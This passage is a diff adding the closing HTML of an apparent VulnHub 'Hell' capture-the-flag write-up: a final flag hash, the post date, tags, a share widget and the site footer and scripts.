+</span><span class='line'>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+2015-07-17 00:01:30 -0400</div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/hell/'>hell</a>, <a class='category' href='/blog/categories/sticky-bit/'>sticky bit</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+
+</div>
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2017
+
+    <font color="green">F4l13n5n0w</font>
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
